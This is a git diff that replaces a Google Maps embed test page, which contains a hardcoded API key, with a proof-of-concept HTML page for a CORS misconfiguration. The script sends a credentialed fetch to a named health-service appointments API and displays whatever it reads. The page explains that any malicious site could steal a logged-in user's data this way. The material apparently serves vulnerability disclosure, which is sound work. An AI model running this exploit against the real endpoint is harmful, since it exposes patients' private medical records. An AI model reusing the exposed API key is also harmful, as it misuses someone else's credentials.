@@ -1,17 +1,58 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>Test Google Maps API Key</title>
-  </head>
-  <body>
-    <iframe
-      width="600"
-      height="450"
-      style="border:0"
-      loading="lazy"
-      allowfullscreen
-      referrerpolicy="no-referrer-when-downgrade"
-      src="https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q=25.2048,55.2708&zoom=15">
-    </iframe>
-  </body>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>PoC: CORS Misconfiguration</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; }
+        button { padding: 10px 20px; font-size: 16px; }
+        pre { background: #f4f4f4; padding: 10px; border: 1px solid #ccc; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <h2>Proof of Concept: CORS Misconfiguration</h2>
+    <p>This code attempts to fetch data from:</p>
+    <code>https://api.medilink.healthatom.com/api/v1/citas</code>
+    <p>with credentials (cookies, authorization headers) automatically included if you are logged into Healthatom in the same browser.</p>
+    <p><strong>Note:</strong> In modern browsers, if the server responds with <code>Access-Control-Allow-Origin: *</code> together with <code>Access-Control-Allow-Credentials: true</code>, the browser will <strong>block reading the response</strong> and an error will appear in the console. If the data is successfully displayed, it means the server is not enforcing the restrictions correctly and the vulnerability is exploitable.</p>
+    
+    <button id="fetchBtn">Execute Request</button>
+    <pre id="result">Result will appear here...</pre>
+
+    <script>
+        document.getElementById('fetchBtn').addEventListener('click', function() {
+            const url = 'https://api.medilink.healthatom.com/api/v1/citas';
+            const resultElement = document.getElementById('result');
+
+            resultElement.textContent = 'Executing...';
+
+            fetch(url, {
+                method: 'GET',
+                credentials: 'include'  // sends cookies and authentication headers
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.text();  // or response.json() if you expect JSON
+            })
+            .then(data => {
+                resultElement.textContent = 'Retrieved data:\n' + data;
+                console.log('Data:', data);
+            })
+            .catch(error => {
+                resultElement.textContent = 'Error:\n' + error.message;
+                console.error('Error:', error);
+            });
+        });
+    </script>
+
+    <hr>
+    <h3>Interpreting the results:</h3>
+    <ul>
+        <li><strong>If data appears</strong>: The vulnerability is fully exploitable – any malicious website can steal your information.</li>
+        <li><strong>If an error appears in the console (e.g., "CORS ...")</strong>: The browser prevented reading the data due to the unsafe configuration, but the misconfiguration still exists and might be a risk in other contexts (e.g., native apps).</li>
+        <li><strong>If another error appears (e.g., 401 Unauthorized)</strong>: The session might be inactive or authentication is required.</li>
+    </ul>
+</body>
 </html>
